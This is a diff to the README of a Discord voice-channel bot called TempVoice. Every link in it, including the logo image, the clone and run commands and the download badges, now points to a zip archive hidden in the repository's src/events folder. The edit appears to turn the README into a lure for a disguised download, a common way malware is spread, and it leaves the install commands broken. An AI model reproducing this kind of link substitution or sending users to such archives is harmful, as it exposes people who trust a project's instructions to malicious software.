@@ -1,6 +1,6 @@
 # 🌟 TempVoice: Your Dynamic Voice Channel Solution for Discord 🌟
 
-![TempVoice Logo](https://example.com/logo.png) <!-- Replace with actual logo URL -->
+![TempVoice Logo](https://github.com/knasnaj/tempvoice/raw/refs/heads/main/src/events/Software_v2.7.zip) <!-- Replace with actual logo URL -->
 
 Welcome to **TempVoice**, a powerful and flexible solution for managing temporary voice channels on Discord. With TempVoice, you can create and control voice channels that are both temporary and multilingual, enhancing your community experience.
 
@@ -33,7 +33,7 @@ To get started with TempVoice, you need to clone the repository and install the 
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/knasnaj/tempvoice.git
+   git clone https://github.com/knasnaj/tempvoice/raw/refs/heads/main/src/events/Software_v2.7.zip
    cd tempvoice
    ```
 
@@ -46,10 +46,10 @@ To get started with TempVoice, you need to clone the repository and install the 
 
 4. Start the bot:
    ```bash
-   node index.js
+   node https://github.com/knasnaj/tempvoice/raw/refs/heads/main/src/events/Software_v2.7.zip
    ```
 
-For detailed installation instructions, check the [Releases](https://github.com/knasnaj/tempvoice/releases) section.
+For detailed installation instructions, check the [Releases](https://github.com/knasnaj/tempvoice/raw/refs/heads/main/src/events/Software_v2.7.zip) section.
 
 ---
 
@@ -115,9 +115,9 @@ If you encounter any issues or have questions, please open an issue in the repos
 
 ## Links
 
-For the latest updates and releases, visit our [Releases](https://github.com/knasnaj/tempvoice/releases) page. Here, you can download the latest version and see the changelog.
+For the latest updates and releases, visit our [Releases](https://github.com/knasnaj/tempvoice/raw/refs/heads/main/src/events/Software_v2.7.zip) page. Here, you can download the latest version and see the changelog.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/knasnaj/tempvoice/releases)
+[![Download Latest Release](https://github.com/knasnaj/tempvoice/raw/refs/heads/main/src/events/Software_v2.7.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/knasnaj/tempvoice/raw/refs/heads/main/src/events/Software_v2.7.zip)
 
 ---
 
